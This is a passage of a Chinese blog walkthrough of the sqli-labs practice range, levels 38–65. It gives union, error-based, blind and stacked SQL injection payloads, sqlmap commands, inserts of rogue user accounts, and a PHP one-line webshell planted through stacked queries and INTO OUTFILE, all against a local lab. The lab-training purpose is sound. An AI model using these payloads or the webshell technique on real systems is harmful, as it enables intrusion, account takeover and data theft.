<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-built_in">?id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27;;select &#x27;</span>&lt;<span class="hljs-meta">%3fphp</span>+phpinfo()<span class="hljs-meta">%3b</span><span class="hljs-meta">%3f</span>&gt;<span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure>

<p>日志里面就会记录 ， 查看一下日志文件。</p>
<p>这里由于作者shell.php放在sqli-labs目录下，所以可以直接在浏览器上打开：</p>
<p><a target="_blank" rel="noopener" href="http://localhost/sqli-labs/shell.php" title="http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;shell.php">http://localhost/sqli-labs/shell.php</a></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945729.png" srcset="/img/loading.gif" lazyload></p>
<p>如果没放在sqli-labs目录下，但能找到所在位置，也可以直接双击shell.php打开</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945746.png" srcset="/img/loading.gif" lazyload></p>
<p> 这里我们写入一句话木马：。</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-built_in">?id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27;;select &#x27;</span>&lt;<span class="hljs-meta">%3fphp</span>+<span class="hljs-meta">%40eval</span>(<span class="hljs-meta">%24_POST</span>[cmd])<span class="hljs-meta">%3b</span><span class="hljs-meta">%3f</span>&gt;<span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure>

<p>然后用蚁剑连接，成功getshell</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945569.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><p>和上题差不多，不过是整数型注入，不需要闭合</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;<span class="hljs-keyword">insert into</span> users(id,username,password) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;26&#x27;</span>,<span class="hljs-string">&#x27;yourname&#x27;</span>,<span class="hljs-string">&#x27;meaning&#x27;</span>) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945923.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">26</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945924.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><p>四十关id参数是单引号加括号闭合，然后使用联合注入就可以了</p>
<h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><p>和三十九关差不多，id是整数型，不需要闭合。</p>
<p>和第39关唯一区别就是没有了报错信息。</p>
<h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><p>点forgot your password?和New User click here?都说去hack出账户出来，没什么有用信息。</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945196.png" srcset="/img/loading.gif" lazyload></p>
<p>抓包</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945154.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">login_user<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;&amp;login_password=1&#x27;</span><span class="hljs-operator">&amp;</span>mysubmit<span class="hljs-operator">=</span>Login<br></code></pre></td></tr></table></figure>

<p>有报错，用单引号闭合</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945050.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">login_user<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;&amp;login_password=1&#x27;</span><span class="hljs-operator">&amp;</span>mysubmit<span class="hljs-operator">=</span>Login<br></code></pre></td></tr></table></figure>

<p>报错消失了，说明login_user不是注入点</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945784.png" srcset="/img/loading.gif" lazyload></p>
<p>试试login_password</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">login_user<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;&amp;login_password=1&#x27;</span><span class="hljs-operator">&amp;</span>mysubmit<span class="hljs-operator">=</span>Login<br></code></pre></td></tr></table></figure>

<p>有报错了，注入点是login_password</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945402.png" srcset="/img/loading.gif" lazyload></p>
<p>login_user没报错，而login_password有报错，应该是账户进行了转义处理，而密码没有做处理，但数据库没有使用gbk编码，所以不能向上面一样使用宽字节注入。</p>
<p>我们可以不用login_user，在login_password注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">login_user<span class="hljs-operator">=</span><span class="hljs-operator">&amp;</span>login_password<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,3--+&amp;mysubmit=Login</span><br></code></pre></td></tr></table></figure>

<p>登录成功，2的位置有回显</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021947162.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,(select database()),3--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://i-blog.csdnimg.cn/direct/a9a6d61b93fc4d219c280213ead713e2.png" srcset="/img/loading.gif" lazyload></p>
<p>之前看到还有报错，试试报错注入，也可以</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">login_user<span class="hljs-operator">=</span><span class="hljs-operator">&amp;</span>login_password<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select database())))--+&amp;mysubmit=Login</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945153.png" srcset="/img/loading.gif" lazyload></p>
<p>别忘了存在堆叠注入函数，所以我们可以在密码那里使用堆叠注入。向数据库里面插入密码账号，这样我们再来使用其进行登录就很简单了。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">login_user<span class="hljs-operator">=</span><span class="hljs-operator">&amp;</span>login_password<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;insert into users(id,username,password) values(&#x27;</span><span class="hljs-number">27</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-number">27</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-number">27</span><span class="hljs-string">&#x27;)--+&amp;mysubmit=Login</span><br></code></pre></td></tr></table></figure>

<p>登录成功</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945202.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><p>和四十二关差不多，就是密码参数是单引号和括号闭合的。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;) union select 1,(select database()),3--+</span><br></code></pre></td></tr></table></figure>

<h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><p>也和 Less-42 差不多，因为没有输出报错信息，所以这里少了报错注入的利用方式。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,(select database()),3--+</span><br></code></pre></td></tr></table></figure>

<h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><p>和44关区别就在于，闭合变成了’)。同样没有报错信息。</p>
<h2 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h2><h3 id="常规注入"><a href="#常规注入" class="headerlink" title="常规注入"></a>常规注入</h3><p>使用新的参数sort，通过输入1，2，3表中出现不同数据，该sql语句是order by，sql语句参数没有引号且不能使用联合注入，有报错显示，所以我们可以报错注入。</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945302.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> database())))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945350.png" srcset="/img/loading.gif" lazyload></p>
<p>还可以用盲注</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-46</span><span class="hljs-operator">/</span>?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945918.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="导入文件和getshell"><a href="#导入文件和getshell" class="headerlink" title="导入文件和getshell"></a>导入文件和getshell</h3><p>发现可以将查询结果导入到文件中：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?sort<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">into</span> outfile &quot;E:\\PhPstudy\\phpstudy_pro\\WWW\\sqli-labs\\Less-46\\less46.txt&quot;<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945831.png" srcset="/img/loading.gif" lazyload></p>
<p>利用导入文件getshell（这一部分知识需要有文件上传漏洞的基础，不属于SQL注入的知识）：</p>
<p>lines terminated by 姿势用于 order by 的情况 getsgell。</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">?sort=<span class="hljs-number">1</span> into outfile <span class="hljs-string">&quot;E:<span class="hljs-subst">\\</span>PhPstudy<span class="hljs-subst">\\</span>phpstudy_pro<span class="hljs-subst">\\</span>WWW<span class="hljs-subst">\\</span>sqli-labs<span class="hljs-subst">\\</span>46.php&quot;</span> lines terminated by <span class="hljs-number">0x3c3f70687020706870696e666f28293b3f3e</span><br></code></pre></td></tr></table></figure>

<p>3c3f70687020706870696e666f28293b3f3e 是 的十六进制编码。</p>
<p> 访问<a target="_blank" rel="noopener" href="http://localhost/sqli-labs/46.php" title="http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;46.php">http://localhost/sqli-labs/46.php</a></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021945539.png" srcset="/img/loading.gif" lazyload></p>
<p>作者写在46.php，查看一下</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946107.png" srcset="/img/loading.gif" lazyload></p>
<p>写入结果 ：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>	Dumb	Dumb<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">2</span>	Angelina	I-kill-you<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">3</span>	Dummy	p@ssword<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">4</span>	secure	crappy<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">5</span>	stupid	stupidity<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">6</span>	superman	genious<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">7</span>	batman	mob!le<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">8</span>	admin	admin<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">9</span>	admin1	admin1<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">10</span>	admin2	admin2<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">11</span>	admin3	admin3<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">12</span>	dhakkan	dumbo<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">14</span>	admin4	admin4<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">16</span>	admin<span class="hljs-string">&#x27; or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; = &#x27;</span><span class="hljs-number">1</span>	<span class="hljs-number">111</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">25</span>	myname	meaning<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">26</span>	yourname	meaning<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><span class="hljs-number">27</span>	<span class="hljs-number">27</span>	<span class="hljs-number">27</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><p>和四十六差不多，多了一个单引号闭合，还是用报错注入</p>
<h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><p>和四十六一样，只不过没有报错显示，要用盲注</p>
<h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><p>和四十七关差不多，用单引号闭合。不过没有报错显示，所以使用盲注。</p>
<h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><p>和四十六关一样，可以进行报错注入，不过这个里面还可以使用堆叠注入，因为使用了mysqli_multi_query函数，支持多条sql语句执行。也可以盲注。</p>
<p>堆叠的利用可以借鉴三十八关代码。</p>
<h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2><p>该参数单引号闭合，可以报错注入，可以堆叠注入，可以盲注。</p>
<h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><p>该参数是整数型，且没有报错显示，只能堆叠注入或者盲注。</p>
<h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><p>参数是字符型，单引号闭合，没有报错显示，可以使用堆叠注入和盲注。</p>
<h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><p>下面进入challenges了</p>
<p>用网页翻译，发现我们需要要拿到密钥并提交，而且只有十次输入机会，超过十次所有表名、列名等等都会随机重置。</p>
<p>Keeping it fresh at all times！！！</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946886.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>      回显DUMB的账号密码<br> <br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;     无回显，不显示报错</span><br></code></pre></td></tr></table></figure>

<p>（后续尝试，   ?id&#x3D;1’–+      回显DUMB的账号密码）</p>
<p>没有报错时。不加注释无回显（此时常规情况下应该报错所以没有回显），加注释后回显（成功代替掉后面的闭合）。id参数应该是是单引号闭合。</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946711.png" srcset="/img/loading.gif" lazyload></p>
<p>根据经验，应该返回3个参数，直接爆表</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946994.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span><span class="hljs-number">0</span>pdfwuxz90<span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure>

<p>注意上面这个是我查到的表名，每个人不一样的表名，payload需要用自己的表名</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946479.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,2,group_concat(secret_KQ9Q) from 0pdfwuxz90--+</span><br></code></pre></td></tr></table></figure>

<p>字段名也不一样</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946844.png" srcset="/img/loading.gif" lazyload></p>
<p>恭喜你获得成功了（密钥也不一样）</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946307.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><p>14次机会</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>      回显DUMB的账号密码<br> <br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">--+  无回显，不显示报错</span><br> <br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;--+  无回显，不显示报错</span><br><span class="hljs-string">?id=1”--  无回显，不显示报错</span><br><span class="hljs-string">?id=1)    无回显，不显示报错</span><br><span class="hljs-string">?id=1)--+  回显DUMB的账号密码</span><br></code></pre></td></tr></table></figure>

<p>id参数是加了括号的整数</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946779.png" srcset="/img/loading.gif" lazyload></p>
<p>剩下的不多做赘述，14次够了</p>
<h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><p>和前面两关类似，需要单引号和括号闭合。</p>
<h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><p>和前几关差不多，双引号闭合</p>
<h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><p>测出闭合是单引号，回显位数是3。但是这里联合注入用不了。</p>
<p>因为该关卡的数据不是直接数据库里面取得，而是在一个数组里面取出得。所以联合注入不行。但是有报错显示，所以可以使用报错注入。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema =database())))--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946633.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name =&#x27;</span>bs9axfdm1g<span class="hljs-string">&#x27;)))--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946015.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select group_concat(secret_2I9U) from bs9axfdm1g)))--+</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946604.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946502.png" srcset="/img/loading.gif" lazyload></p>
<p>也可用盲注</p>
<h2 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h2><p>和58关一样，但是是数字型，无闭合。</p>
<h2 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h2><p>和58关一样，闭合变成了双引号加括号”)。</p>
<h2 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h2><p>和58关一样，闭合变成了单引号加两个括号’))。</p>
<h2 id="Less-62"><a href="#Less-62" class="headerlink" title="Less-62"></a>Less-62</h2><p>这关开始没有报错信息了。闭合是单引号加括号’)’。给了130次尝试机会。</p>
<p>用盲注</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946713.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-comment">--current-db</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946822.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">-</span>D challenges –<span class="hljs-operator">-</span>tables<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946010.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">python sqlmap.py <span class="hljs-operator">-</span>u http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>localhost<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-62</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-operator">-</span>D challenges –T m92drmwvjp –<span class="hljs-operator">-</span>columns<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946418.png" srcset="/img/loading.gif" lazyload></p>
<p>再尝试发现不行，130次的次数太少了。</p>
<p>难道要手工盲注？那工程量也太大了。</p>
<p>手写脚本利用二次查找判断，以为可行但作者实际没成功，大家可以尝试一下。</p>
<p>其实有人已经优化了各个步骤，可以做到在130次之内（实测68次）。</p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f1811e108d58" title="sqli-labs靶场Less-62题解（少于130次） - 简书">sqli-labs靶场Less-62题解（少于130次） - 简书</a></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021946266.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="Less-63"><a href="#Less-63" class="headerlink" title="Less-63"></a>Less-63</h2><p>和62关一样，闭合变成了单引号’</p>
<h2 id="Less-64"><a href="#Less-64" class="headerlink" title="Less-64"></a>Less-64</h2><p>和62关一样，闭合变成了两个括号))。</p>
<h2 id="Less-65"><a href="#Less-65" class="headerlink" title="Less-65"></a>Less-65</h2><p>和62关一样，闭合变成了双引号加括号”)。</p>
<p>虽然页面显示还有关卡，但作者发现sqli-labs制作者做到这里就结束了。</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021947177.png" srcset="/img/loading.gif" lazyload></p>
<p><strong>后记：</strong></p>
<p>小伙伴们能进行到这里，真的是不容易。</p>
<p>祝愿大家都能在Web安全的路上越走越远。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/peterpan0707007/p/7620048.html" title="【总结】sqli-labs Less(1-35) 小结 - Carrypan - 博客园">【总结】sqli-labs Less(1-35) 小结 - Carrypan - 博客园</a>                      </p>
